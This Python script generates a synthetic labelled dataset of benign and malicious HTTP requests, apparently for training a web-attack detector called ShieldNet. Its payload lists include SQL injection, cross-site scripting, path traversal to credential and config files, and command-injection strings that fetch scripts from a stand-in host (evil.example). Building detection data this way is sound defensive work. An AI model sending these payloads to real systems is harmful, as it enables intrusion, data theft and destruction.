"""Generate a synthetic labelled dataset of benign vs. attack HTTP requests.

Why synthetic: it gives a reproducible starting corpus today. It is NOT a
substitute for a real dataset — the next iteration trains on CSIC-2010 plus
ShieldNet's own logged traffic from PostgreSQL. Metrics on synthetic data
will look optimistic; treat them as a pipeline check, not a research result.

Usage: python ml/generate_dataset.py --rows 2400 --out ml/data/dataset.csv
"""
import argparse
import csv
import random
import urllib.parse

BENIGN = [
    ("GET", "/", ""), ("GET", "/search?q=coffee+mug", ""), ("GET", "/search?q=running+shoes", ""),
    ("GET", "/product?id=1", ""), ("GET", "/product?id=2", ""), ("GET", "/product?id=3", ""),
    ("GET", "/search?q=cotton+t-shirt+size+m", ""), ("POST", "/login", "username=demo&password=demo"),
    ("GET", "/about", ""), ("GET", "/static/style.css", ""), ("GET", "/favicon.ico", ""),
    ("GET", "/search?q=tea+pot&page=2", ""), ("POST", "/cart/add", "product_id=2&qty=1"),
    ("GET", "/orders?user=demo&status=shipped", ""), ("GET", "/search?q=", ""),
]

SQLI = [
    "' UNION SELECT username, password FROM users --",
    "' OR '1'='1", "1; DROP TABLE users; --", "' OR 1=1 --",
    "1 UNION SELECT null, version() --", "' AND SLEEP(5) --",
    "admin' --", "' UNION ALL SELECT 1,2,3 --", "1' ORDER BY 10 --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
]
XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(1)>", "javascript:alert(1)",
    "<iframe src='http://evil.example'></iframe>", "\"><script>alert('xss')</script>",
    "<body onload=alert(1)>", "<script>eval(location.hash)</script>",
]
TRAVERSAL = [
    "../../etc/passwd", "..%2f..%2fetc%2fpasswd", "....//....//etc/passwd",
    "/static/../../.env", "%2e%2e%2f%2e%2e%2f.git/config", "..\\..\\windows\\win.ini",
]
RCE = [
    "; cat /etc/passwd", "| whoami", "$(curl http://evil.example/sh)",
    "`id`", "&& wget http://evil.example/x.sh", "; ls -la /",
]

ATTACKS = [("sqli", SQLI), ("xss", XSS), ("traversal", TRAVERSAL), ("rce", RCE)]
TARGETS = ["/search?q={p}", "/product?id={p}", "/login", "/search?q={p}&page=1"]


def mutate(payload: str, rng: random.Random) -> str:
    choice = rng.random()
    if choice < 0.3:
        return urllib.parse.quote(payload, safe="")
    if choice < 0.5:
        return payload.upper()
    if choice < 0.7:
        return payload.replace(" ", "/**/")
    return payload


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--rows", type=int, default=2400)
    ap.add_argument("--out", default="ml/data/dataset.csv")
    ap.add_argument("--seed", type=int, default=42)
    args = ap.parse_args()
    rng = random.Random(args.seed)

    rows = []
    half = args.rows // 2
    for _ in range(half):
        method, uri, body = rng.choice(BENIGN)
        rows.append({"method": method, "uri": uri, "body": body, "label": 0, "attack_type": "benign"})
    for _ in range(args.rows - half):
        attack_type, payloads = rng.choice(ATTACKS)
        payload = mutate(rng.choice(payloads), rng)
        target = rng.choice(TARGETS)
        if "{p}" in target:
            uri, body = target.format(p=urllib.parse.quote_plus(payload) if rng.random() < 0.5 else payload), ""
            method = "GET"
        else:
            uri, body, method = target, f"username={payload}&password=x", "POST"
        rows.append({"method": method, "uri": uri, "body": body, "label": 1, "attack_type": attack_type})
    rng.shuffle(rows)

    with open(args.out, "w", newline="", encoding="utf-8") as fh:
        writer = csv.DictWriter(fh, fieldnames=["method", "uri", "body", "label", "attack_type"])
        writer.writeheader()
        writer.writerows(rows)
    print(f"wrote {len(rows)} rows to {args.out}")


if __name__ == "__main__":
    main()
